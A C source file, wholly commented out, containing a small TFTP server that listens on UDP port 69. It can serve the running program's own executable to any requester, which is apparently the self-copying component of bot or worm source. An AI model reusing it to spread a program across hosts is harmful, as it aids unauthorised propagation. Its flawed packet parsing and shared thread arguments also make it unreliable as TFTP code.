#include "include.h"
#include "extern.h"
/*
typedef struct TFTP_RRQ 
{ 
    unsigned short int opcode; 
    char *filename; 
    unsigned char reserved; 
    char *mode; 
    unsigned char reserve; 
} TFTP_RRQ; 

typedef struct TFTP_PACKET 
{ 
    unsigned short int opcode; 
    unsigned short int block_id; 
    char data[512]; 
} TFTP_PACKET; 

typedef struct TFTP_RECEIVE 
{ 
    unsigned short int opcode; 
    unsigned short int block_id; 
} TFTP_RECEIVE; 

  const unsigned short int RRQ  = 1; 
  const unsigned short int WRQ  = 2; 
  const unsigned short int DATA = 3; 
  const unsigned short int ACK  = 4; 
  const unsigned short int ERR  = 5; 

  BOOL TFTP_Listening; 
  SOCKET TFTP_Sock; 
  char TFTP_FileName[256]; 
  HANDLE TFTP_Handle; 
  unsigned int TFTP_Connections = 0, TFTP_Sent = 0; 

  DWORD _stdcall TFTP_Listen(void *Parameter); 
  DWORD _stdcall TFTP_Send(void *parameter); 

void TFTP_Start(BOOL self) 
{ 
  DWORD lpThreadId; 

  if (TFTP_Listening) return; 
  TFTP_Listening = TRUE; 
  if (self) { 
    memset(TFTP_FileName, 0, sizeof(TFTP_FileName)); 
    GetModuleFileName(GetModuleHandle(NULL), TFTP_FileName, sizeof(TFTP_FileName)); 
  } 
  TFTP_Handle = CreateThread(NULL, 0, &TFTP_Listen, NULL, 0, &lpThreadId); 
} 

DWORD _stdcall TFTP_Listen(void *Parameter) 
{ 
  SOCKADDR_IN addr; 
  FD_SET fd; 
  TIMEVAL tv; 
  TFTP_RRQ buffer; 
  int i; 
  unsigned int addrlen; 
  DWORD lpThreadId; 
  BOOL bOptVal = TRUE; 
  int bOptLen = sizeof(BOOL); 

  TFTP_Sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); 
  if (TFTP_Sock == INVALID_SOCKET) ExitThread(0); 
  
  setsockopt(TFTP_Sock, SOL_SOCKET, SO_REUSEADDR, (char *)&bOptVal, bOptLen); 
  
  memset(&addr, 0, sizeof(addr)); 
  addr.sin_family = AF_INET; 
  addr.sin_port = htons(69); 
  addr.sin_addr.s_addr = INADDR_ANY; 

  if (bind(TFTP_Sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR) { 
    closesocket(TFTP_Sock); 
    if (TFTP_Listening) TFTP_Listening = FALSE; 
    ExitThread(0); 
  } 

  while (TFTP_Listening) { 
    FD_ZERO(&fd); 
    FD_SET(TFTP_Sock, &fd); 
    memset(&tv, 0, sizeof(tv)); 
    tv.tv_sec = 5; 
    tv.tv_usec = 0; 

    i = select(0, &fd, NULL, NULL, &tv); 
    if (i > 0) { 
      addrlen = sizeof(addr); 
      memset(&buffer, 0, sizeof(buffer)); 
      i = recvfrom(TFTP_Sock, (char *)&buffer, sizeof(buffer), 0, (struct sockaddr *)&addr, &addrlen); 
      if (i != SOCKET_ERROR) { 
        TFTP_Connections++; 
        if (ntohs(buffer.opcode) == RRQ) { 
          CreateThread(NULL, 0, &TFTP_Send, (void *)&addr, 0, &lpThreadId); 
          Sleep(1000); 
        } 
      } 
    } 
  } 

  closesocket(TFTP_Sock); 
  return 0; 
} 

DWORD _stdcall TFTP_Send(void *parameter) 
{ 
  SOCKET sock; 
  struct sockaddr_in sin; 
  struct TFTP_PACKET buffer; 
  struct TFTP_RECEIVE buf; 
  unsigned short int block_id; 
  unsigned int sinlen; 
  int size = 0; 
  FILE *file = 0; 

  if (parameter == NULL) ExitThread(0); 
  sin = *(struct sockaddr_in *)parameter; 

  sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); 
  if (sock == INVALID_SOCKET) ExitThread(0); 

  file = fopen(TFTP_FileName, "rb"); 
  if (file == NULL) ExitThread(0); 

  block_id = 0; 
  sinlen = sizeof(sin); 

  while (!feof(file)) { 
    memset(&buffer, 0, sizeof(buffer)); 
    memset(&buf, 0, sizeof(buf)); 

    block_id++; 
    buffer.block_id = htons(block_id); 
    buffer.opcode = htons(DATA); 
    size = fread(buffer.data, sizeof(char), sizeof(buffer.data), file); 

    if (sendto(sock, (char *)&buffer, size+4, 0, (struct sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR) { 
      closesocket(sock); 
      fclose(file); 
      ExitThread(0); 
    } 

    if (recvfrom(sock, (char *)&buf, sizeof(buf), 0, (struct sockaddr *)&sin, &sinlen) == SOCKET_ERROR) { 
      closesocket(sock); 
      fclose(file); 
      ExitThread(0); 
    } 

    if (ntohs(buf.opcode) != ACK || ntohs(buf.block_id) != block_id) { 
      closesocket(sock); 
      fclose(file); 
      ExitThread(0); 
    } 

  } 
  TFTP_Sent++; 
  closesocket(sock); 
  fclose(file); 

  return 0; 

} 
*/